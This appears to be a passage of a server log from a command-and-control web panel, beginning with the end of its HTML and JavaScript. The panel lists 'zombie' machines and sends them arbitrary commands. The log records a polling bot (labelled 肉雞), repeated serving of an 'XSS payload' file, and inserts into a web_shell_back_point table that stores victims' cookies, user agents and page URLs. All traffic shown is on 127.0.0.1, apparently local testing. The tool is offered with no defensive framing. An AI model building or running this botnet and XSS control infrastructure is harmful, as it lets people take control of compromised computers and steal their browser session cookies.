隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:21:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:46] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:21:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:46] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:21:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:46] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:21:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 23:21:47 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 23:21:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-24 23:21:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:47] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 23:21:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:21:47 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 23:21:47 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T15:21:47.963Z"}', None, '2025-06-24 23:21:47.967915', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:21:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 23:21:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:47] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 23:21:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 23:22:13 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 23:22:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-24 23:22:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:13] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 23:22:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:22:13 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 23:22:13 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T15:22:13.003Z"}', None, '2025-06-24 23:22:13.008126', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:22:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 23:22:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:13] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 23:22:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 23:22:13 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 23:22:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-24 23:22:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:13] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 23:22:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:22:13 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 23:22:13 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T15:22:13.500Z"}', None, '2025-06-24 23:22:13.502479', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:22:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 23:22:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:13] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 23:22:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 23:22:13 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 23:22:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-24 23:22:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:13] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 23:22:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:22:13 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 23:22:13 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T15:22:13.695Z"}', None, '2025-06-24 23:22:13.698513', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:22:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 23:22:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:13] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 23:22:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 23:22:13 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 23:22:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-24 23:22:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:13] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 23:22:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:22:13 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 23:22:13 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T15:22:13.851Z"}', None, '2025-06-24 23:22:13.855185', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:22:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 23:22:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:13] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 23:22:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 23:22:14 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 23:22:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-24 23:22:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:14] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 23:22:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:22:14 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 23:22:14 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
